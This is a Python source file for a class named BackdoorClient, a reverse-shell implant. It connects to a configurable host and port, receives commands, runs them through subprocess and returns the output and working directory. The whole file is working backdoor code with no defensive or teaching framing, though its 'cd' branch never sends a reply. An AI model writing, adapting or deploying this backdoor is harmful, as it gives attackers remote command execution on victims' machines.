import socket, subprocess, os

class BackdoorClient:
    def __init__(self, host, port, buffer_size=1024, sep="<sep>"):
        self.host, self.port, self.buffer_size, self.sep = host, port, buffer_size, sep
        self.client_socket = None

    def start(self):
        self.connect()
        self.send_cd()
        self.interact()

    def connect(self):
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect((self.host, self.port))
        print(f"[*] Connected to {self.host}:{self.port}")

    def send(self, data):
        self.client_socket.send(data)

    def receive(self):
        return self.client_socket.recv(self.buffer_size).decode()

    def send_cd(self):
        self.send(os.getcwd().encode())

    def interact(self):
        while True:
            command = self.receive()
            parts = command.split()

            if parts[0].lower() == "cd":
                try:
                    os.chdir(' '.join(parts[1:]))
                except FileNotFoundError as e:
                    output = str(e)
                else:
                    output = ""
            else:
                output = subprocess.getoutput(command)
                cwd = os.getcwd()
                message = f"{output}{self.sep}{cwd}"
                self.send(message.encode())

def main():
    host, port = "127.0.0.1", 9999
    backdoor_client = BackdoorClient(host, port)
    try:
        backdoor_client.start()
    except KeyboardInterrupt:
        print("[*] Connection closed by user.")

if __name__ == "__main__":
    main()
